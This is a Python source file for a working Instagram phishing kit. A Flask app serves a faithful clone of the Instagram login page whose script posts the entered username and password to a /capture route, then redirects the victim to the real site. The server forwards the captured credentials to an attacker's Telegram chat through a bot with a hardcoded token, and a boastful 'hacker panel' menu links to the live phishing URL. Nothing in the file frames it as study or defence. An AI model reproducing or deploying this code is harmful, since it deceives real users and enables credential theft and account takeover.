import os
import telebot
from telebot import types
from flask import Flask, render_template_string, request, jsonify

# --- CONFIGURATION ---
BOT_TOKEN = "8765709173:AAEwy6NbFKLNKsqfjDayvef4fJGfwxVSDlM"
ADMIN_CHAT_ID = "7161571409"

# Tera Render ka live URL yahan set hai Maharaj
PORTAL_URL = "https://instagram-6zbs.onrender.com"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# --- 100% REAL INSTAGRAM CLONE UI ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
        .wrapper { max-width: 350px; width: 100%; margin-bottom: 10px; }
        .auth-card { background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px 40px; margin-bottom: 10px; text-align: center; }
        .logo { font-family: 'Instagram Billabong', cursive, sans-serif; font-size: 50px; margin-bottom: 35px; font-weight: normal; color: #262626; }
        .input-field { position: relative; margin-bottom: 6px; width: 100%; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; color: #262626; font-size: 12px; padding: 9px 0 7px 8px; outline: none; }
        input:focus { border-color: #a8a8a8; background: #fff; }
        .login-btn { width: 100%; background: #0095f6; border: none; border-radius: 4px; color: #fff; padding: 7px 16px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 14px; }
        .login-btn:hover { background: #1877f2; }
        .divider { display: flex; align-items: center; margin: 15px 0 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .divider::before { margin-right: 18px; }
        .divider::after { margin-left: 18px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: flex; justify-content: center; align-items: center; margin-bottom: 15px; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; margin-top: 12px; }
        .signup-card { background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; text-align: center; font-size: 14px; color: #262626; }
        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
        .footer { text-align: center; font-size: 12px; color: #8e8e8e; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="auth-card">
            <h1 class="logo">Instagram</h1>
            <form id="loginForm" onsubmit="captureData(event)">
                <div class="input-field">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-field">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <div class="divider">OR</div>
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot">Forgot password?</a>
        </div>
        <div class="signup-card">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
    <div class="footer">From Meta</div>

    <script>
        async function captureData(e) {
            e.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;

            // Send credentials securely to backend
            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: u, password: p })
            });

            // Redirect user to real Instagram after entering details
            window.location.href = "https://www.instagram.com";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        alert_msg = (
            f"🎯 **TARGET CREDENTIALS SECURED, MAHARAJ!** 🎯\n\n"
            f"👤 **Username/Phone:** `{username}`\n"
            f"🔑 **Password:** `{password}`\n\n"
            f"😈🔥 *NICK HACKER VIP NETWORK*"
        )
        bot.send_message(ADMIN_CHAT_ID, alert_msg, parse_mode="Markdown")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "failed"})

# --- TELEGRAM BOT WEBHOOK / POLLING SETUP ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_name = message.from_user.first_name if message.from_user.first_name else "Maharaj"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_insta = types.InlineKeyboardButton("🔐 Instagram VIP Portal", url=PORTAL_URL)
    btn_cam = types.InlineKeyboardButton("📸 Camera Capture Tool", url=PORTAL_URL)
    btn_status = types.InlineKeyboardButton("💎 Check Account Status", callback_data="check_status")
    
    markup.add(btn_insta, btn_cam, btn_status)
    
    welcome_msg = (
        f"😈 **WELCOME TO NICK HACKER PANEL, MAHARAJ {user_name.upper()}!** 😈\n\n"
        f"Saare tools active hain. Niche diye gaye buttons pe tap kar! 🔥"
    )
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "check_status")
def callback_query(call):
    bot.answer_callback_query(call.id, "VIP Status Checked Successfully!")
    bot.send_message(
        call.message.chat.id, 
        "💎 **VIP MEMBER STATUS**\n\n"
        f"👤 Telegram ID: `{call.from_user.id}`\n"
        "⭐ Access Level: **Full Unrestricted**\n"
        "🔗 Status: **Online & Ready** 😈🔥", 
        parse_mode="Markdown"
    )

if __name__ == "__main__":
    import threading
    # Background thread for Telegram Bot Polling
    bot_thread = threading.Thread(target=lambda: bot.infinity_polling())
    bot_thread.daemon = True
    bot_thread.start()
    
    # Flask Web App for Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
    
